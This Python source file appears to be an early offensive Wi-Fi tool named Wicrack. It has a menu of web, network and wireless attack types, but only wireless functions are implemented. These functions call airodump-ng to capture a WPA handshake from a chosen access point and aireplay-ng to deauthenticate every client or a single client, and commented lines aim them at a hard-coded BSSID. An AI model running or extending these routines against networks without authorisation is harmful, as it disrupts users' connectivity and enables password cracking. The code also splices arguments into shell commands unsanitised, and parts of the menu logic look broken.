#!/usr/bin/python3

import os
from threading import Thread
import time


class Wicrack(object):
    """Main class of the program"""
    __author__ = 'piper'

    def info():
        print(" Wicrack v0.1")
        print(" By %s"%Wicrack.__author__)
        print(" github: https://github.com/piperjames/wicrack")

    menu_options = {-1: {-1: 'Select Job',
                        1: {'Wifi': {-1: 'Select Interface> ',
                                     1: ['wlan0'],
                                     0: 'Back<<'}},
                        2: {'WebApp':   {-1: 'Select Attack Method',
                                     1: ['SQL Injection (SQLi)'],
                                     2: ['Cross Site Scripting (Xss)'],
                                     3: ['Cross Site Request Forgery (CRSF)'],
                                     4: ['Content Spoofing'],
                                     5: ['Clickjacking'],
                                     6: ['Tabnabbing'],
                                     7: ['Denial of Service'],
                                     8: ['Man-In-The-Browser'],
                                     9: ['Phishing'],
                                     0: 'Back<<'}
                            },
                        3: {'Network':  {-1: 'Select Attack Method',
                                     1: ['Bruteforcing'],
                                     2: ['Man-In-The-Middle'],
                                     3: ['Buffer Overflow'],
                                     0: 'Back<<'}}
                        }
                    }

    def __init__(self):
        Wicrack.info()
        self.current_menu_option = [-1]
        self.current_menu = Wicrack.menu_options[self.current_menu_option[-1]]
        self.menu()

    def menu(self):
        print("")
        for key in self.current_menu.keys():
            if key == -1:
                print(self.current_menu[key])
            elif str(key).isalpha():
                for opt in self.current_menu[key].keys():
                    if opt == -1:
                        print(" [%s] %s"%(key, self.current_menu[key][opt]))
                    elif opt == 0:
                        print(" [%d] %s"%(opt, self.current_menu[key][opt]))
                    else:
                        print(" [%d] %s"%(opt, self.current_menu[key][opt][0]))
            else:
                for opt in self.current_menu[key].keys():
                    print(" [%d] %s"%(key, opt))
        print("")
        while True:
            try:
                job = int(input("Choose Option> "))
                if job == 0:
                    if len(self.current_menu_option) > 1:
                        self.current_menu_option.pop()
                        self.current_menu = Wicrack.menu_options[-1]
                        for key in self.current_menu_option[:-1]:
                            self.current_menu = self.current_menu[key]
                            print(self.current_menu)
                        self.menu()
                elif job >= 1:
                    self.current_menu_option.append(job)
                    self.current_menu = self.current_menu[job]
                    self.menu()
            except KeyboardInterrupt:
                time.sleep(1)
                print('\nGoodbye :)')
                time.sleep(1)
                print('Exiting...')
                time.sleep(1)
                exit(1)
            except Exception as e:
                print(str(e))
                continue



def capture_handshake(bssid, channel, interface='wlan0'):
    """Capture Handshake with airodump-ng"""
    print('Capturing Handshake')
    os.system("rm *.cap 2>/dev/null")
    os.popen("xterm -T 'Capture Handshake' -geometry -500+1 -e '"+\
             "airodump-ng --bssid "+bssid+" --channel "+str(channel)+\
             " --write wicrack --output-format cap "+interface+"'")

def deauthenticate_all(bssid, interface='wlan0'):
    """Deauthenticate all users on interface: %s"""%interface
    print('Deauthenticating Connected Devices')
    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
             "aireplay-ng --deauth 5 -a "+bssid+" "+interface+"'")
    time.sleep(5)
    os.system("killall airodump-ng")

def deauthenticate_one(bssid, station, interface='wlan0'):
    """Deauthenticate one user (%s) on interface: %s"""%(station, interface)
    print('Deauthenticating Connected Devices')
    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
             "aireplay-ng --deauth 5 -a "+bssid+" -c "+station+\
             " "+interface+"'")
    time.sleep(5)
    os.system("killall airodump-ng")


if __name__ == "__main__":
        Wicrack()

#Thread(target=capture_handshake, args=('BE:B3:08:CC:58:C5', 1)).start()
#Thread(target=deauthenticate, args=('BE:B3:08:CC:58:C5', 1)).start()
